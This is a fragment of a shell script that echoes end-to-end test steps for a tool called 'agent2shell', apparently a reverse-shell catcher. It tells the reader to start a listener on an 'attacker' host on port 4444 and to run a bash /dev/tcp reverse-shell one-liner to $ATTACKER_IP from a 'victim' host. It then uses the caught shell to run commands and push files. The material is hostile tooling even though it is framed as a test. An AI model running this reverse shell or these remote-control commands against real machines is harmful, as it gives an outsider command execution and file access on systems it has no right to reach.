...
echo "E2E Test Steps:"
echo ""
echo "  1. SSH into attacker and start listener:"
echo "     ./agent2shell catch -p 4444"
echo ""
echo "  2. SSH into victim and send reverse shell:"
echo "     bash -c 'bash -i >& /dev/tcp/$ATTACKER_IP/4444 0>&1'"
echo ""
...
echo "     ./agent2shell -s /tmp/a2s-ec2.sock run whoami"
echo "     ./agent2shell -s /tmp/a2s-ec2.sock status"
echo "     ./agent2shell -s /tmp/a2s-ec2.sock push ./test.txt /tmp/test.txt"
echo ""
